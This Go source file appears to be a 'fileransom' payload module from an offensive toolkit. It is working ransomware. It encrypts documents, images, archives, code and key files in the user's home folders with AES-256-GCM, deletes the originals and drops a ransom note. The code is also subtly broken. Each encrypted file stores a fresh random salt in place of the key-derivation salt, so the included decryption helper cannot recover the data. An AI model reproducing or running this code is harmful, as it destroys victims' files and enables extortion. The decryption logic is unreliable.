package payloads

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/crypto/pbkdf2"
)

func init() {
	Register(&FileRansom{})
}

type FileRansom struct{}

func (f *FileRansom) Name() string        { return "fileransom" }
func (f *FileRansom) Category() string    { return "impact" }
func (f *FileRansom) Description() string { return "AES-256-GCM file encryption with ransom note" }

func (f *FileRansom) Execute(args map[string]string) ([]byte, error) {
	target := args["target"]
	mode := args["mode"]
	password := args["password"]

	result := f.encrypt(target, mode, password)
	return MarshalJSON(result)
}

type ransomResult struct {
	Timestamp      string    `json:"timestamp"`
	Password       string    `json:"password"`
	Mode           string    `json:"mode"`
	EncryptedFiles int       `json:"encrypted_files"`
	TotalFiles     int       `json:"total_files"`
	TargetDirs     []string  `json:"target_directories"`
	Files          []encFile `json:"files"`
	RansomNote     string    `json:"ransom_note,omitempty"`
}

type encFile struct {
	Original  string `json:"original"`
	Encrypted string `json:"encrypted"`
	Size      int64  `json:"size"`
}

var ransomExtensions = []string{
	".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
	".jpg", ".jpeg", ".png", ".gif", ".bmp",
	".zip", ".tar", ".gz", ".7z", ".rar",
	".sql", ".db", ".sqlite", ".csv", ".xml", ".json", ".yml", ".yaml",
	".py", ".js", ".html", ".css", ".php", ".java", ".cpp", ".c", ".go",
	".mp3", ".mp4", ".avi", ".mkv",
	".odt", ".ods", ".odp", ".rtf", ".tex", ".md",
	".key", ".pem", ".crt", ".p12",
}

var systemCritical = []string{
	"/etc", "/boot", "/proc", "/sys", "/dev", "/run", "/lib", "/bin", "/sbin", "/usr",
}

func (f *FileRansom) encrypt(target, mode, password string) *ransomResult {
	if password == "" {
		b := make([]byte, 16)
		rand.Read(b)
		password = fmt.Sprintf("%x", b)
	}

	salt := make([]byte, 16)
	rand.Read(salt)
	key := pbkdf2.Key([]byte(password), salt, 100000, 32, sha256.New)

	r := &ransomResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Password:  password,
		Mode:      mode,
	}

	var targetDirs []string
	home, _ := os.UserHomeDir()

	switch {
	case mode == "system_test":
		targetDirs = []string{"/tmp"}
	case mode == "system_user" || strings.HasPrefix(mode, "system_"):
		targetDirs = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Downloads"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Pictures"),
		}
	case target == "all" || target == "":
		targetDirs = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Downloads"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Pictures"),
		}
	case target != "":
		targetDirs = []string{target}
	}

	r.TargetDirs = targetDirs

	for _, dir := range targetDirs {
		enc, total := encryptDirectory(dir, key, r)
		r.EncryptedFiles += enc
		r.TotalFiles += total
	}

	// Ransom note
	noteContent := fmt.Sprintf(`=============================================
 YOUR FILES HAVE BEEN ENCRYPTED
=============================================

Your important files have been encrypted with AES-256 encryption.

To decrypt, you need the password.

Password: %s

=============================================
 INSTRUCTIONS
=============================================
1. Save this password securely
2. Run decryption with this password
3. All .encrypted files will be restored

=============================================
Generated: %s
Total Files Encrypted: %d
=============================================`, password, time.Now().Format(time.RFC3339), r.EncryptedFiles)

	notePath := filepath.Join(home, "README_FOR_DECRYPT.txt")
	os.WriteFile(notePath, []byte(noteContent), 0644)
	r.RansomNote = notePath

	return r
}

func encryptDirectory(dir string, key []byte, r *ransomResult) (int, int) {
	encrypted := 0
	total := 0

	// Check if dir is in critical system path
	for _, crit := range systemCritical {
		if strings.HasPrefix(dir, crit) {
			return 0, 0
		}
	}

	filepath.Walk(dir, func(path string, fi os.FileInfo, err error) error {
		if err != nil || fi.IsDir() {
			return nil
		}

		// Check extension
		ext := strings.ToLower(filepath.Ext(path))
		matched := false
		for _, e := range ransomExtensions {
			if ext == e {
				matched = true
				break
			}
		}
		if !matched {
			return nil
		}

		// Skip already encrypted
		if strings.HasSuffix(path, ".encrypted") {
			return nil
		}

		total++

		// Encrypt
		if encFile := encryptSingleFile(path, key); encFile != nil {
			r.Files = append(r.Files, *encFile)
			encrypted++
		}

		return nil
	})

	return encrypted, total
}

func encryptSingleFile(path string, key []byte) *encFile {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	// AES-256-GCM
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}

	nonce := make([]byte, aesGCM.NonceSize())
	rand.Read(nonce)

	ciphertext := aesGCM.Seal(nil, nonce, data, nil)
	encryptedPath := path + ".encrypted"

	// Format: nonce + salt + ciphertext
	salt := make([]byte, 16)
	rand.Read(salt)
	output := append(nonce, salt...)
	output = append(output, ciphertext...)

	if err := os.WriteFile(encryptedPath, output, 0600); err != nil {
		return nil
	}

	os.Remove(path)

	return &encFile{
		Original:  path,
		Encrypted: encryptedPath,
		Size:      int64(len(output)),
	}
}

// Decryption helper
func decryptFile(path string, password string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	if len(data) < 32 {
		return fmt.Errorf("file too short")
	}

	nonce := data[:12]
	salt := data[12:28]
	ciphertext := data[28:]

	key := pbkdf2.Key([]byte(password), salt, 100000, 32, sha256.New)

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	outPath := strings.TrimSuffix(path, ".encrypted")
	return os.WriteFile(outPath, plaintext, 0600)
}

var _ = json.Marshal
var _ = base64.StdEncoding
